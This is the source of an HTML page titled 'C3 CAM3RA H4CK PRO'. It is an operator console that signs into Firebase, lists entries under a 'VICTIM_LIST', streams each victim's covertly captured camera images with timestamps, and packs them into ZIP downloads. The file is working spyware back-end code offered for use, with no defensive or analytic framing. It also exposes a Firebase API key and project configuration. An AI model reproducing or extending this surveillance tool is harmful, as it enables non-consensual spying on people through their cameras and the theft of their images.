<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TERMINAL - C3 CAM3RA H4CK PRO</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
    <style>
        body { background: #000; font-family: 'Courier New', monospace; color: #0f0; }
        .hacker-card { background: rgba(0, 20, 0, 0.9); border: 1px solid #0f0; box-shadow: 0 0 15px #0f0; }
        input { background: #000; border: 1px solid #0f0; color: #0f0; outline: none; }
        .glitch { animation: glitch 1s linear infinite; }
        @keyframes glitch { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body class="p-4 flex flex-col items-center">

    <div id="login-section" class="w-full max-w-md mt-20 hacker-card p-8 rounded-lg">
        <h2 class="text-2xl mb-6 font-bold glitch uppercase">Restricted Access</h2>
        <input type="email" id="email" placeholder="ADMIN EMAIL" class="w-full p-3 mb-4">
        <input type="password" id="password" placeholder="PASSWORD" class="w-full p-3 mb-6">
        <button onclick="login()" class="w-full bg-green-900 hover:bg-green-600 text-white font-bold py-3 border border-green-400">BYPASS SYSTEM</button>
    </div>

    <div id="admin-dashboard" class="hidden w-full max-w-6xl">
        <header class="flex justify-between items-center mb-8 border-b border-green-500 pb-4">
            <div>
                <h1 class="text-3xl font-bold glitch">CONSOLE@C3-HACKER:~$</h1>
                <p class="text-xs">Real-time Data Stream Active...</p>
            </div>
            <button onclick="logout()" class="text-red-500 hover:underline">[ DISCONNECT ]</button>
        </header>

        <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
            <div class="md:col-span-1 hacker-card p-4 rounded h-[600px] overflow-y-auto">
                <h3 class="border-b border-green-500 mb-4 pb-2">VICTIM_LIST</h3>
                <ul id="victim-list" class="text-sm space-y-2 cursor-pointer"></ul>
            </div>

            <div class="md:col-span-3 hacker-card p-4 rounded flex flex-col">
                <div class="flex justify-between mb-4">
                    <h3>LIVE_STREAM: <span id="active-id" class="text-white">None</span></h3>
                    <button onclick="downloadZip()" class="text-xs bg-green-700 text-black px-2 py-1 font-bold">GENERATE ZIP</button>
                </div>
                <div id="image-grid" class="grid grid-cols-2 md:grid-cols-4 gap-4 overflow-y-auto h-[500px] p-2 bg-black border border-green-900">
                    </div>
            </div>
        </div>
    </div>
/*
<script type="module">
  // Import the functions you need from the SDKs you need
  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
  import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-analytics.js";
  // TODO: Add SDKs for Firebase products that you want to use
  // https://firebase.google.com/docs/web/setup#available-libraries

  // Your web app's Firebase configuration
  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
  const firebaseConfig = {
    apiKey: "AIzaSyB1JFtbUY5u10m2ElIA5NfacOtLkdU3YNc",
    authDomain: "edoajah-7d3b7.firebaseapp.com",
    databaseURL: "https://edoajah-7d3b7-default-rtdb.firebaseio.com",
    projectId: "edoajah-7d3b7",
    storageBucket: "edoajah-7d3b7.firebasestorage.app",
    messagingSenderId: "379480683867",
    appId: "1:379480683867:web:64a3b4d3428266970dd67e",
    measurementId: "G-TBDRJ0GEGL"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
</script> 
*/
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <script>
        const firebaseConfig = { apiKey: "AIzaSyB1JFtbUY5u10m2ElIA5NfacOtLkdU3YNc", databaseURL: "https://edoajah-7d3b7-default-rtdb.firebaseio.com/", projectId: "edoajah-7d3b7" };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();

        let currentVictim = "";

        function login() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('password').value;
            auth.signInWithEmailAndPassword(e, p).catch(err => alert(err.message));
        }

        auth.onAuthStateChanged(user => {
            if(user) {
                document.getElementById('login-section').classList.add('hidden');
                document.getElementById('admin-dashboard').classList.remove('hidden');
                listenVictims();
            } else {
                document.getElementById('login-section').classList.remove('hidden');
                document.getElementById('admin-dashboard').classList.add('hidden');
            }
        });

        function listenVictims() {
            db.ref('captures').on('value', snapshot => {
                const list = document.getElementById('victim-list');
                list.innerHTML = "";
                snapshot.forEach(child => {
                    let li = document.createElement('li');
                    li.className = "hover:bg-green-900 p-1 truncate";
                    li.innerText = "> " + child.key;
                    li.onclick = () => showStream(child.key);
                    list.appendChild(li);
                });
            });
        }

        function showStream(id) {
            currentVictim = id;
            document.getElementById('active-id').innerText = id;
            db.ref('captures/' + id).on('value', snapshot => {
                const grid = document.getElementById('image-grid');
                grid.innerHTML = "";
                snapshot.forEach(img => {
                    let container = document.createElement('div');
                    container.className = "border border-green-500 relative";
                    container.innerHTML = `<img src="${img.val().url}" class="w-full h-auto"><p class="text-[8px] absolute bottom-0 bg-black w-full text-center">${new Date(img.val().timestamp).toLocaleTimeString()}</p>`;
                    grid.prepend(container);
                });
            });
        }

        async function downloadZip() {
            if(!currentVictim) return;
            const zip = new JSZip();
            const images = document.querySelectorAll('#image-grid img');
            
            for(let i=0; i<images.length; i++) {
                const response = await fetch(images[i].src);
                const blob = await response.blob();
                zip.file(`capture_${i}.jpg`, blob);
            }
            
            zip.generateAsync({type:"blob"}).then(content => {
                const link = document.createElement('a');
                link.href = URL.createObjectURL(content);
                link.download = currentVictim + ".zip";
                link.click();
            });
        }
    </script>
</body>
</html>
